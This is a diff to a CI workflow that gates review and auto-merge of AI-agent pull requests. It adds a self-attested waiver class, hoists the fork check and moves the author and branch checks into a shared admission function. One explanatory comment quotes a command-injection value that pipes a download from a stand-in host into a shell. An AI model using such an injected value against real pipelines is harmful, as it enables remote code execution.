@@ -101,6 +101,10 @@ jobs:
       head_sha: ${{ steps.pr.outputs.head_sha }}
       base_ref: ${{ steps.pr.outputs.base_ref }}
       pr_author: ${{ steps.pr.outputs.pr_author }}
+      # [#657] TRUE iff this PR was admitted under the orchestrator-class waiver, i.e. its
+      # provenance record is SELF-ATTESTED. Consumed by the outcome step (the draft
+      # requirement stands down) and by the arm (which REFUSES the class outright).
+      self_attested: ${{ steps.pr.outputs.self_attested }}
       impl_provider: ${{ steps.pr.outputs.impl_provider }}
       impl_alias: ${{ steps.pr.outputs.impl_alias }}
       impl_account_h: ${{ steps.pr.outputs.impl_account_h }}
@@ -241,6 +245,7 @@ jobs:
           import re
           import subprocess
           import sys
+          import tomllib
           from pathlib import Path
 
           with open(sys.argv[1], encoding="utf-8") as handle:
@@ -248,11 +253,17 @@ jobs:
           repo = os.environ["TARGET_REPO"]
           mode = os.environ["MODE"]
           fix_kind = os.environ.get("FIX_KIND") or "verdict"
-          if pull.get("state") != "open" or pull.get("draft") is not True:
-              raise SystemExit("pull request is not an open draft")
+          if pull.get("state") != "open":
+              raise SystemExit("pull request is not open")
           head = pull.get("head") or {}
           head_repo = (head.get("repo") or {}).get("full_name")
           head_branch = str(head.get("ref", ""))
+          # FORK GATE FIRST and unconditional (#657 follow-up): once the orchestrator-class
+          # waiver below can stand down the draft / head-ref / author gates, the fork gate has
+          # to be the one no waiver can reach — hoisted above every waivable predicate rather
+          # than left to the accident of ordering, exactly as dispatch-claim.py hoists it.
+          if head_repo != repo:
+              raise SystemExit("pull request head is a fork; refusing to run models on it")
           # sol r6 on #257: the reviewer diffs against the DEFAULT branch; a worker PR
           # retargeted to any other base would be reviewed against one comparison and
           # merged against another — reject it at resolution (the sweep re-derives; a
@@ -264,14 +275,8 @@ jobs:
                                "refusing to review/arm")
           head_sha = str(head.get("sha", ""))
           author = str((pull.get("user") or {}).get("login", ""))
-          if head_repo != repo:
-              raise SystemExit("pull request head is a fork; refusing to run models on it")
-          if not re.fullmatch(r"sparq-agent/issue-([1-9][0-9]*)-[A-Za-z0-9._-]+", head_branch):
-              raise SystemExit("pull request head is not a worker branch")
           if not re.fullmatch(r"[0-9a-f]{40}", head_sha):
               raise SystemExit("pull request head sha is malformed")
-          if not author.endswith("[bot]"):
-              raise SystemExit("pull request author is not a bot")
           labels = sorted({
               label.get("name") for label in (pull.get("labels") or [])
               if isinstance(label, dict) and isinstance(label.get("name"), str)
@@ -329,7 +334,27 @@ jobs:
               "registry_dispatch_claim", Path("registry", "scripts", "dispatch-claim.py"))
           dispatch_claim = importlib.util.module_from_spec(spec)
           spec.loader.exec_module(dispatch_claim)
-          admission_error = dispatch_claim.provenance_admission_error(record, pull["number"])
+          # [OPUS-5 #657] The MASTER-protected half of orchestrator-PR admission, read from the
+          # private `registry` checkout (master) — NEVER from the `registry-ledger` checkout the
+          # provenance record came from. Records live on ledger precisely because master's
+          # required gate rejects direct PUTs, so the record half is a low-authority per-PR
+          # gesture and this list is the reviewed half that bounds which logins it can ever name;
+          # reading both from one branch would collapse the pair. `_policy_row` validates the
+          # whole row, so a malformed list HARD-FAILS this step rather than silently resolving to
+          # "nobody is enrolled". Absent/empty => enrolment OFF => the shape gates stand.
+          spec_enrol = importlib.util.spec_from_file_location(
+              "registry_policy_resolve_enrol", Path("registry", "scripts", "policy-resolve.py"))
+          policy_enrol = importlib.util.module_from_spec(spec_enrol)
+          spec_enrol.loader.exec_module(policy_enrol)
+          with open(Path("registry", "policy", "repos.toml"), "rb") as handle:
+              enrolled_authors = policy_enrol.review_enrolment_authors(
+                  repo, tomllib.load(handle))
+          # THE #657 ADMISSION SEAM. Both facts — "may this PR's draft/head-ref/author shape gates
+          # be waived?" and "does its provenance record admit?" — come from ONE shared function in
+          # dispatch-claim.py, so no predicate lives in this `run:` script that a text probe would
+          # have to guess at. Fail closed: any error is a SystemExit.
+          self_attested, admission_error = dispatch_claim.review_fix_pr_admission(
+              repo, pull, record, enrolled_authors, mode)
           if admission_error:
               raise SystemExit(admission_error)
           impl_provider = record["impl_provider"]
@@ -416,6 +441,7 @@ jobs:
               "head_sha": head_sha,
               "base_ref": str((pull.get("base") or {}).get("ref", "")),
               "pr_author": author,
+              "self_attested": "true" if self_attested else "false",
               "impl_provider": impl_provider,
               "impl_alias": impl_alias,
               "impl_account_h": impl_account_h,
@@ -1453,6 +1479,10 @@ jobs:
           # Catalog-controlled provider reaches this job via env ONLY — never interpolated into the
           # run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
           IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
+          # [#657] Resolved HOST-SIDE in the resolve job (from the master-protected allowlist +
+          # the ledger record), never from a workflow input: the class decides whether the draft
+          # freshness requirement applies and whether an approve may arm.
+          SELF_ATTESTED: ${{ needs.resolve.outputs.self_attested }}
         run: |
           set -euo pipefail
           args=(
@@ -1470,6 +1500,7 @@ jobs:
             --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}"
           )
           [[ "$SECURITY" == "true" ]] && args+=(--security)
+          [[ "$SELF_ATTESTED" == "true" ]] && args+=(--self-attested)
           while IFS= read -r p; do
             [[ -n "$p" ]] && args+=(--surface-path "$p")
           done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
@@ -1517,6 +1548,10 @@ jobs:
           # would execute (issue #199). worker-pr.py ready-and-arm asserts reviewer != implementer.
           IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
           REVIEWER_PROVIDER: ${{ needs.claim.outputs.provider }}
+          # [#657] The arm REFUSES this class (worker-pr.ready_and_arm): a self-attested record
+          # cannot authorise a merge, because the cross-provider assertion below is derived by
+          # inverting a field the implementer wrote about itself.
+          SELF_ATTESTED: ${{ needs.resolve.outputs.self_attested }}
         run: |
           set -euo pipefail
           args=(
@@ -1532,6 +1567,7 @@ jobs:
             --bot-login "${{ needs.resolve.outputs.pr_author }}"
             --reviewed-base "${{ needs.resolve.outputs.base_ref }}"
           )
+          [[ "$SELF_ATTESTED" == "true" ]] && args+=(--self-attested)
           while IFS= read -r p; do
             [[ -n "$p" ]] && args+=(--surface-path "$p")
           done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
